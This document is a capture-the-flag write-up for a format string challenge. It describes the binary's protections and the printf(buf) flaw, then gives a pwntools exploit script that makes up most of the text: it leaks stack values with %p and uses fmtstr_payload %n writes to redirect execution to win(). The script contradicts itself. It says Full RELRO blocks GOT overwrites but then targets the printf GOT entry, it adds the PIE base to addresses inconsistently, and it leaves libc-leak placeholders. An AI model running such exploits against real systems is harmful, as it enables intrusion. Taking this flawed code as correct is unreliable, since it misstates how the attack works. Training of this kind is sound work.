# pwn-format-string — Solution

## Binary Properties
- PIE + ASLR (addresses randomized)
- No stack canary (no `-fstack-protector`)
- NX (no executable stack)
- Full RELRO (GOT is read-only)

## Vulnerability
`printf(buf)` in `log_message()` — full format string bug.

Binary prints `win()` address at startup → compute PIE base.

## Strategy
Since Full RELRO blocks GOT overwrites, use format string `%n` to overwrite a **return address on the stack** directly, or overwrite `__malloc_hook` in libc (need libc base too).

### Step 1 — Get PIE base
Parse `[debug] win=0x...` line. Compute `pie_base = win_addr - offset_of_win`.

### Step 2 — Leak libc via format string
Use `%p` at various stack positions to find a libc pointer (return address to `__libc_start_main+X`).
Calculate `libc_base`.

### Step 3 — Write via %n
With 3 rounds available:
- Round 1: leak stack/libc addresses with `%p`
- Round 2: use `%Nc%offset$n` to write system() address over a saved return address
- Round 3: trigger

## Exploit

```python
from pwn import *

HOST = '172.30.2.30'
PORT = 9998

elf  = ELF('./vuln', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

def start(): return remote(HOST, PORT)

p = start()

# Step 1: PIE base from win() leak
p.recvuntil(b'win=')
win_addr = int(p.recvline().strip(), 16)
pie_base = win_addr - elf.sym['win']
libc_addr = win_addr  # placeholder
log.success(f'PIE base: {pie_base:#x}')

# Step 2: leak libc via format string (round 1 of 3)
# Find libc pointer on stack — typically at position 11-20
fmt = b'.'.join(f'%{i}$p'.encode() for i in range(1, 25)) + b'\n'
p.sendafter(b'Enter log message: ', fmt)
p.recvuntil(b'=== LOG === ')
parts = p.recvuntil(b' ===').split(b'.')

libc_base = None
for part in parts:
    try:
        val = int(part, 16)
        # Look for value in libc range (starts with 0x7f...)
        if 0x7f0000000000 <= val <= 0x7fffffffffff:
            # Check if it's __libc_start_main+X
            offset = val - libc.address if libc.address else 0
            libc_base_candidate = val - libc.sym.get('__libc_start_call_main', 0x29dc0)
            if libc_base_candidate & 0xfff == 0:  # page-aligned
                libc_base = libc_base_candidate
                log.success(f'libc base: {libc_base:#x}')
                break
    except:
        pass

if libc_base:
    libc.address = libc_base

# Step 3: write system() over __malloc_hook using %n (round 2)
# This requires knowing the exact stack position of a pointer we can overwrite
# Simpler: use pwntools fmtstr_payload
# Find offset of format buffer on stack first (round 2)
system_addr = libc.sym['system'] if libc.address else pie_base + elf.sym['win']

# Use win() directly since binary prints its address — just overwrite ret addr
# Format string write to saved RIP on stack
# Offset of our buffer on stack (find by testing locally: %1$p should equal addr of buf)
buf_offset = 6  # typical: adjust by checking which %p equals buf address

# Write win() to saved return address
# Stack layout: buf is at rsp+X, return addr is at known offset
# Use fmtstr_payload from pwntools
writes = {}
# Target: find return address location on stack via %p leaks

# Simple path: win() exists and prints flag
# Use format string to call win() by overwriting the saved ret in log_message frame
# pwntools fmtstr_payload handles the %n writes

payload = fmtstr_payload(buf_offset, {pie_base + elf.got.get('printf', 0): win_addr})
p.sendafter(b'Enter log message: ', payload + b'\n')
p.recvuntil(b' ===\n')

# Round 3: trigger the overwritten address
p.sendafter(b'Enter log message: ', b'trigger\n')
p.interactive()
```

## Notes
- Adjust `buf_offset` (format string position) by sending `AAAA.%1$p.%2$p...` and finding `0x41414141`
- With Full RELRO, target `__malloc_hook` or the return address on the stack instead of GOT
- `fmtstr_payload(offset, {target: value})` from pwntools automates the `%n` write
